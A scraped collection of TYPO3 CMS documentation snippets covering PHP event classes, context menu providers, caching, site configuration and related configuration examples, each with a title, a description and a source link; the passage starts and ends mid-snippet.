php\nCODE:\n```\nreturn [\n    'my_module' => [\n        'parent' => 'web',\n        'aliases' => ['newmodule'],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Applying Workspace Restrictions in TYPO3 Database Queries\nDESCRIPTION: Demonstrates the use of WorkspaceRestriction to limit SQL queries to select only records that are 'online' (pid != -1) and in the live or current workspace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Query\\Restriction\\WorkspaceRestriction\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFileCreatedEvent Class in PHP\nDESCRIPTION: This code snippet defines the BeforeFileCreatedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. It includes properties for the file, folder, and fileName, along with getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFileCreatedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforeFileCreatedEvent\n{\n    private File $file;\n    private Folder $folder;\n    private string $fileName;\n\n    public function __construct(File $file, Folder $folder, string $fileName)\n    {\n        $this->file = $file;\n        $this->folder = $folder;\n        $this->fileName = $fileName;\n    }\n\n    public function getFile(): File\n    {\n        return $this->file;\n    }\n\n    public function getFolder(): Folder\n    {\n        return $this->folder;\n    }\n\n    public function getFileName(): string\n    {\n        return $this->fileName;\n    }\n\n    public function setFileName(string $fileName): void\n    {\n        $this->fileName = $fileName;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Context Menu Item Provider in TYPO3 CMS with PHP\nDESCRIPTION: This code snippet defines a HelloWorldItemProvider class that adds a custom 'Hello World' item to the TYPO3 backend context menu. It demonstrates how to configure the item, handle its display, set provider priority, and integrate with JavaScript for callback actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/ContextMenu/HelloWorldItemProvider.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nnamespace T3docs\\Examples\\ContextMenu;\n\n/**\n * This file is part of the TYPO3 CMS project.\n *\n * It is free software; you can redistribute it and/or modify it under\n * the terms of the GNU General Public License, either version 2\n * of the License, or any later version.\n *\n * For the full copyright and license information, please read the\n * LICENSE.txt file that was distributed with this source code.\n *\n * The TYPO3 project - inspiring people to share!\n */\n\nuse TYPO3\\CMS\\Backend\\ContextMenu\\ItemProviders\\AbstractProvider;\n\n/**\n * Item provider adding Hello World item\n */\nclass HelloWorldItemProvider extends AbstractProvider\n{\n    /**\n     * This array contains configuration for items you want to add\n     * @var array\n     */\n    protected $itemsConfiguration = [\n        'hello' => [\n            'type' => 'item',\n            'label' => 'Hello World', // you can use \"LLL:\" syntax here\n            'iconIdentifier' => 'actions-lightbulb-on',\n            'callbackAction' => 'helloWorld', //name of the function in the JS file\n        ],\n    ];\n\n    /**\n     * Checks if this provider may be called to provide the list of context menu items for given table.\n     *\n     * @return bool\n     */\n    public function canHandle(): bool\n    {\n        // Current table is: $this->table\n        // Current UID is: $this->identifier\n//        return $this->table === 'pages';\n        return true;\n    }\n\n    /**\n     * Returns the provider priority which is used for determining the order in which providers are processing items\n     * to the result array. Highest priority means provider is evaluated first.\n     *\n     * This item provider should be called after PageProvider which has priority 100.\n     *\n     * BEWARE: Returned priority should logically not clash with another provider.\n     *         Please check @see \\TYPO3\\CMS\\Backend\\ContextMenu\\ContextMenu::getAvailableProviders() if needed.\n     *\n     * @return int\n     */\n    public function getPriority(): int\n    {\n        return 55;\n    }\n\n    /**\n     * Registers the additional JavaScript RequireJS callback-module which will allow to display a notification\n     * whenever the user tries to click on the \"Hello World\" item.\n     * The method is called from AbstractProvider::prepareItems() for each context menu item.\n     *\n     * @param string $itemName\n     * @return array\n     */\n    protected function getAdditionalAttributes(string $itemName): array\n    {\n        return [\n            'data-callback-module' => '@t3docs/examples/context-menu-actions',\n            // Here you can also add any other useful \"data-\" attribute you'd like to use in your JavaScript (e.g. localized messages)\n        ];\n    }\n\n    /**\n     * This method adds custom item to list of items generated by item providers with higher priority value (PageProvider)\n     * You could also modify existing items here.\n     * The new item is added after the 'info' item.\n     *\n     * @param array $items\n     * @return array\n     */\n    public function addItems(array $items): array\n    {\n        $this->initDisabledItems();\n        // renders an item based on the configuration from $this->itemsConfiguration\n        $localItems = $this->prepareItems($this->itemsConfiguration);\n\n        if (isset($items['info'])) {\n            //finds a position of the item after which 'hello' item should be added\n            $position = array_search('info', array_keys($items), true);\n\n            //slices array into two parts\n            $beginning = array_slice($items, 0, $position+1, true);\n            $end = array_slice($items, $position, null, true);\n\n            // adds custom item in the correct position\n            $items = $beginning + $localItems + $end;\n        } else {\n            $items = $items + $localItems;\n        }\n        //passes array of items to the next item provider\n        return $items;\n    }\n\n    /**\n     * This method is called for each item this provider adds and checks if given item can be added\n     *\n     * @param string $itemName\n     * @param string $type\n     * @return bool\n     */\n    protected function canRender(string $itemName, string $type): bool\n    {\n        // checking if item is disabled through TSConfig\n        if (in_array($itemName, $this->disabledItems, true)) {\n            return false;\n        }\n        $canRender = false;\n        switch ($itemName) {\n            case 'hello':\n                $canRender = $this->canSayHello();\n                break;\n        }\n        return $canRender;\n    }\n\n    /**\n     * Helper method implementing e.g. access check for certain item\n     *\n     * @return bool\n     */\n    protected function canSayHello(): bool\n    {\n        //usually here you can find more sophisticated condition. See e.g. PageProvider::canBeEdited()\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFolderAddedEvent Class in TYPO3 CMS Core Resource\nDESCRIPTION: This code snippet defines the BeforeFolderAddedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class provides methods to retrieve the parent folder and the name of the folder being added.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFolderAddedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFolderAddedEvent\n{\n    public function getParentFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Implementation not shown\n    }\n\n    public function getFolderName(): string\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PHP Error Handling in TYPO3\nDESCRIPTION: Sets the default error handling configuration for TYPO3, excluding certain error types from being handled. E_USER_DEPRECATED errors are always handled regardless of this setting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nE_ALL & ~(E_STRICT | E_NOTICE | E_COMPILE_WARNING | E_COMPILE_ERROR | E_CORE_WARNING | E_CORE_ERROR | E_PARSE | E_ERROR)\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Auto-wiring in TYPO3 YAML\nDESCRIPTION: Extended service configuration to enable cache auto-wiring for dependency injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Developer/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  cache.myext_mycache:\n    class: TYPO3\\CMS\\Core\\Cache\\Frontend\\FrontendInterface\n    factory: ['@TYPO3\\CMS\\Core\\Cache\\CacheManager', 'getCache']\n    arguments:\n      - 'myext_mycache'\n\n  MyVendor\\MyExtension\\MyClass:\n    arguments:\n      $cache: '@cache.myext_mycache'\n```\n\n----------------------------------------\n\nTITLE: RST Image Reference for TYPO3 Install Tool Screenshot\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of the Remove Temporary Assets option in the TYPO3 Install Tool, including alt text and styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/RemoveTemporaryAssets.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AdminTools/RemoveTemporaryAssets.png\n   :alt: Remove temporary assets\n   :class: with-shadow\n\n   The option \"Remove temporary assets\" in the Install Tool.\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Minimal Package with Composer\nDESCRIPTION: Example of requiring the TYPO3 minimal package using Composer. This command installs the minimal TYPO3 core with a version constraint of 12.x or higher.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncomposer require \"typo3/minimal:^12\"\n```\n\n----------------------------------------\n\nTITLE: RecordCreationEvent Class Definition and Methods\nDESCRIPTION: Defines the RecordCreationEvent class with methods for manipulating record properties. This class allows for the creation and modification of record properties, including system properties and context management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/RecordCreationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Domain\\Event;\n\nclass RecordCreationEvent {\n    public function setRecord(\\TYPO3\\CMS\\Core\\Domain\\RecordInterface $record)\n    public function isPropagationStopped(): bool\n    public function hasProperty(string $name): bool\n    public function setProperty(string $name, ?mixed $propertyValue)\n    public function setProperties(array $properties)\n    public function unsetProperty(string $name): bool\n    public function getProperty(string $name): ?mixed\n    public function getProperties(): array\n    public function getRawRecord(): \\TYPO3\\CMS\\Core\\Domain\\RawRecord\n    public function getSystemProperties(): \\TYPO3\\CMS\\Core\\Domain\\Record\\SystemProperties\n    public function getContext(): \\TYPO3\\CMS\\Core\\Context\\Context\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Ajax Route for Custom Field Control in TYPO3\nDESCRIPTION: This configuration adds an Ajax route for the custom field control in TYPO3. It defines the 'record_import' route and maps it to the ImportDataController class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'record_import' => [\n        'path' => '/record/import',\n        'target' => \\MyVendor\\MyExtension\\Controller\\Ajax\\ImportDataController::class . '::importDataAction'\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Accessing Current Site and Language Objects via Request\nDESCRIPTION: Shows how to retrieve the current site and site language objects from a PSR-7 request object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/AccessingSiteConfiguration.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// current site\n$site = $request->getAttribute('site');\n\n// current site language\n$siteLanguage = $request->getAttribute('language');\n```\n\n----------------------------------------\n\nTITLE: Resulting CSP HTTP Header\nDESCRIPTION: The HTTP Content-Security-Policy header resulting from the inherit-again mode configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: http\nCODE:\n```\nContent-Security-Policy: default-src data:; img-src data: 'self' example.com\n```\n\n----------------------------------------\n\nTITLE: Using PageTree Helper in TYPO3 Acceptance Tests\nDESCRIPTION: PHP code showing how to use the PageTree helper in a TYPO3 acceptance test case.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/AcceptanceTesting/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Styleguide\\Tests\\Acceptance\\Support\\Helper\\PageTree;\n\nclass ElementsBasicInputDateCest\n{\n    public function _before(PageTree $pageTree)\n    {\n        $pageTree->openPath(['styleguide TCA demo', 'elements basic']);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Site Set Configuration in YAML\nDESCRIPTION: This snippet shows how to define a site set configuration in a YAML file, including name, label, settings, and dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-vendor/my-set\nlabel: My Set\nsettings:\n  website:\n    background:\n      color: '#386492'\ndependencies:\n  - my-vendor/my-other-set\n  - other-namespace/fancy-carousel\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Error Handler in YAML for TYPO3\nDESCRIPTION: This YAML snippet demonstrates how to configure a custom 404 error handler in a TYPO3 site configuration file. It specifies the error code, handler type, and the fully qualified class name of the custom error handler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ErrorHandling/WriteCustomErrorHandler.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nerrorHandling:\n  - errorCode: 404\n    errorHandler: PHP\n    errorPhpClassFQCN: '\\MyVendor\\MySitePackage\\Error\\MyErrorHandler'\n```\n\n----------------------------------------\n\nTITLE: Configuring Website Title Provider in TypoScript\nDESCRIPTION: TypoScript configuration to register and set the priority of the website title provider that uses site configuration data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/PageTitleApi.rst#2025-04-16_snippet_4\n\nLANGUAGE: TypoScript\nCODE:\n```\nconfig.pageTitleProviders {\n    website {\n        provider = MyVendor\\MySitePackage\\PageTitle\\WebsiteTitleProvider\n        before = record, seo\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using FlexFormService to Read FlexForm Content in PHP\nDESCRIPTION: Demonstrates how to use the FlexFormService to convert FlexForm content to an array in a non-Extbase controller. Includes dependency injection and a method to load FlexForm data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Service\\FlexFormService;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\nfinal class NonExtbaseController\n{\n\n    // Inject FlexFormService\n    public function __construct(\n        private readonly FlexFormService $flexFormService,\n    ) {\n    }\n\n    // ...\n\n    private function loadFlexForm($flexFormString): array\n    {\n        return $this->flexFormService\n            ->convertFlexFormContentToArray($flexFormString);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering a Scheduler Task in TYPO3\nDESCRIPTION: This code snippet demonstrates how to register a scheduler task within the `ext_tables.php` file. The scheduler extension must be installed for this to work.  This approach allows the scheduler to recognize and execute the defined task.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTables.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndefined('TYPO3') or die();\n\nuse TYPO3\\CMS\\Scheduler\\Task\\ExampleCommandTask;\n\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['scheduler']['tasks'][ExampleCommandTask::class] = [\n    'extension' => 'site_package',\n    'title' => 'Example Scheduler Task',\n    'description' => 'This is an example scheduler task.',\n    'additionalFields' => '\\\\Vendor\\\\SitePackage\\\\Scheduler\\\\AdditionalFieldProvider',\n];\n\n```\n\n----------------------------------------\n\nTITLE: TypoScript Modifier Function Example\nDESCRIPTION: Example showing the syntax for using a custom TypoScript modifier function. Demonstrates how to set an original value and apply a modifier function with an argument.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/EvaluateModifierFunctionEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nfoo = myOriginalValue\nfoo := myNewFunction(myFunctionArgument)\n```\n\n----------------------------------------\n\nTITLE: Handling Frontend User Logout with LogoutConfirmedEvent in TYPO3 CMS\nDESCRIPTION: Example listener for the LogoutConfirmedEvent that deletes a private key from disk when a user logs out. This event listener is triggered when a frontend user actively logs out, but cannot determine the specific user who logged out directly from the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/LogoutConfirmedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\EventListeners;\n\nuse TYPO3\\CMS\\FrontendLogin\\Event\\LogoutConfirmedEvent;\n\nfinal class DeletePrivateKeyOnLogout\n{\n    public function __invoke(LogoutConfirmedEvent $event): void\n    {\n        // Determine the user which just logged out\n        // Details outside of scope of this example\n        $user = $this->determineUserWhoJustLoggedOut();\n\n        if ($user instanceof \\MyVendor\\MyExtension\\Domain\\Model\\FrontendUser) {\n            // Delete private key from disk\n            // Details out of scope of this example\n            $this->deletePrivateKey($user);\n        }\n    }\n\n    private function determineUserWhoJustLoggedOut(): ?\\MyVendor\\MyExtension\\Domain\\Model\\FrontendUser\n    {\n        // Logic to determine which user just logged out\n        // Beyond scope of this example\n        return null;\n    }\n\n    private function deletePrivateKey(\\MyVendor\\MyExtension\\Domain\\Model\\FrontendUser $user): void\n    {\n        // Logic to delete user's private key from disk\n        // Beyond scope of this example\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Routing Aspect in TYPO3\nDESCRIPTION: Example of registering a custom route aspect in TYPO3's ext_localconf.php file. This allows the aspect to be used in routing configuration as a type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/ExtendingRouting.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['routing']['aspects']['MyCustomMapperNameAsUsedInYamlConfig'] = \\Vendor\\Extension\\Routing\\Aspect\\MyCustomAspect::class;\n```\n\n----------------------------------------\n\nTITLE: Using Custom Page Title Provider in Extbase Controller\nDESCRIPTION: Example of using the custom page title provider in an Extbase controller to set the page title based on a record's title.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/PageTitleApi.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse MyVendor\\MyExtension\\PageTitle\\MyOwnPageTitleProvider;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass SomeController extends ActionController\n{\n    protected MyOwnPageTitleProvider $pageTitleProvider;\n\n    public function injectPageTitleProvider(MyOwnPageTitleProvider $pageTitleProvider): void\n    {\n        $this->pageTitleProvider = $pageTitleProvider;\n    }\n\n    public function detailAction(Record $record): ResponseInterface\n    {\n        $this->pageTitleProvider->setTitle($record->getTitle());\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Core Events Documentation Structure in reStructuredText\nDESCRIPTION: This snippet sets up the structure for documenting Core events in TYPO3 CMS. It includes a title, index entries, and a table of contents for sub-pages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core\n..  _eventlist-core:\n\n\n====\nCore\n====\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core .\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    */Index\n```\n\n----------------------------------------\n\nTITLE: Fluid Template with Sections in HTML\nDESCRIPTION: Shows a Fluid template that corresponds to the layout example. It defines sections that are rendered by the layout file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<f:layout name=\"Default\" />\n<f:section name=\"Main\">\n    <h1>Hello World</h1>\n    <f:render partial=\"SomePartial\" arguments=\"{_all}\" />\n</f:section>\n```\n\n----------------------------------------\n\nTITLE: Setting Mbox Transport File Path\nDESCRIPTION: This snippet indicates the file path where mails are written when using the mbox transport method. It must conform to mbox format and the path should be absolute to ensure accessibility.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_17\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_mbox_file']\n:type: text\n:Default: ''\n\n*only with transport=mbox* The file where to write the mails into.\n```\n\n----------------------------------------\n\nTITLE: Configuring PSR-4 Autoloading in TYPO3 Extension\nDESCRIPTION: Composer configuration that defines the package name 'ttn/tea' and sets up PSR-4 autoloading to map the TTN\\Tea namespace to the Classes/ directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/ComposerJsonAutoload.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"ttn/tea\",\n    \"autoload\": {\n        \"psr-4\": {\n            \"TTN\\\\Tea\\\\\": \"Classes/\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining SortVersionedDataEvent Class in TYPO3 CMS Workspaces\nDESCRIPTION: This snippet defines the SortVersionedDataEvent class used in the TYPO3 CMS Workspaces module. It includes methods for getting and setting data, sort column, and sort direction for versioned data in workspaces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Workspaces/SortVersionedDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Workspaces\\Event;\n\nclass SortVersionedDataEvent\n{\n    public function getGridService(): \\TYPO3\\CMS\\Workspaces\\Service\\GridDataService\n    {\n        // Implementation not provided\n    }\n\n    public function getData(): array\n    {\n        // Implementation not provided\n    }\n\n    public function setData(array $data)\n    {\n        // Implementation not provided\n    }\n\n    public function getSortColumn(): string\n    {\n        // Implementation not provided\n    }\n\n    public function setSortColumn(string $sortColumn)\n    {\n        // Implementation not provided\n    }\n\n    public function getSortDirection(): string\n    {\n        // Implementation not provided\n    }\n\n    public function setSortDirection(string $sortDirection)\n    {\n        // Implementation not provided\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining CacheFlushEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the CacheFlushEvent class in the TYPO3\\CMS\\Core\\Cache\\Event namespace. The class represents an event that is fired when caches are to be cleared and provides methods for managing cache groups and errors.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Cache/CacheFlushEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\Cache\\Event\n\n..  php:class:: CacheFlushEvent\n\n    Event fired when caches are to be cleared\n\n    ..  php:method:: getGroups()\n        :returns: `array`\n\n    ..  php:method:: hasGroup(string $group)\n        :returns: `bool`\n\n        :param $group: the group\n\n    ..  php:method:: getErrors()\n        :returns: `array`\n\n    ..  php:method:: addError(string $error)\n\n        :param $error: the error\n```\n\n----------------------------------------\n\nTITLE: Namespace Imports Example in PHP\nDESCRIPTION: Demonstrates how to import necessary PHP classes using `use` statements.  These imports should follow the TYPO3 Coding Standards (based on PER-CS1.0 / PSR-12 at the time of this writing, transitioning towards PER-CS2.0). One blank line should be placed before and after the import statements, and each import statement should be on its own line.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/FileStructure.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n    use TYPO3\\CMS\\Core\\Utility\\HttpUtility;\n    use TYPO3\\CMS\\Core\\Cache\\Backend\\BackendInterface;\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Field Control in TYPO3 TCA\nDESCRIPTION: This code demonstrates how to configure a custom field control in TYPO3's TCA (Table Configuration Array). It adds an 'importData' control to the 'title' field of the 'pages' table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA']['pages']['columns']['title']['config']['fieldControl']['importData'] = [\n    'renderType' => 'importDataControl',\n    'disabled' => false,\n    'options' => [\n        'title' => 'Import Data',\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Changing Group Header in TSConfig\nDESCRIPTION: Shows how to override the header of a content element group in the New Content Element wizard using Page TSconfig.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/ContentElementsWizard.rst#2025-04-16_snippet_6\n\nLANGUAGE: TSConfig\nCODE:\n```\nmod.wizards.newContentElement.wizardItems.my_group {\n    header = My group header\n}\n```\n\n----------------------------------------\n\nTITLE: Using Categories in TYPO3 FlexForms\nDESCRIPTION: This code shows how to implement category relationships in FlexForms. It creates a field with a one-to-many relationship to categories due to FlexForm limitations not supporting many-to-many relationships.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Categories/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<field_categories>\n    <label>LLL:EXT:core/Resources/Private/Language/locallang_tca.xlf:sys_category.categories</label>\n    <config>\n        <type>category</type>\n    </config>\n</field_categories>\n```\n\n----------------------------------------\n\nTITLE: Displaying Flash Messages with Fluid ViewHelper (HTML)\nDESCRIPTION: Illustrates how to use the Fluid FlashMessages ViewHelper to display flash messages in a TYPO3 backend module template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/Extbase.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"typo3-docbody\">\n   <div id=\"typo3-inner-docbody\">\n      <f:flashMessages />\n      <f:render section=\"main\" />\n   </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Quoting Values with TYPO3 QueryBuilder in PHP\nDESCRIPTION: Demonstrates the correct methods to use for quoting values, identifiers, and sub-expressions when using TYPO3's QueryBuilder. This is crucial for preventing SQL injection attacks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_EscapeWarning.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nquote()\nquoteIdentifier\ncreateNamedParameter\n```\n\n----------------------------------------\n\nTITLE: Injecting the PropertyMapper in Extbase\nDESCRIPTION: This code demonstrates how to inject the TYPO3 Extbase PropertyMapper, which is a prerequisite for using the PropertyMapper methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/PropertyMapping.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\include :: /CodeSnippets/Extbase/PropertyManager/PropertyMapperInjection.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyLanguagePackRemoteBaseUrlEvent Class\nDESCRIPTION: Class definition for handling language pack URL modifications in TYPO3. Provides methods to get and set the base URL and retrieve the package key for language packs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Install/ModifyLanguagePackRemoteBaseUrlEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Install\\Service\\Event;\n\nclass ModifyLanguagePackRemoteBaseUrlEvent {\n    public function getBaseUrl(): \\Psr\\Http\\Message\\UriInterface;\n    public function setBaseUrl(\\Psr\\Http\\Message\\UriInterface $baseUrl);\n    public function getPackageKey(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a BeforeSearchInDatabaseRecordProviderEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for the BeforeSearchInDatabaseRecordProviderEvent in TYPO3. This listener demonstrates how to exclude specific tables from search results and restrict searching to specific page IDs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforeSearchInDatabaseRecordProviderEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse 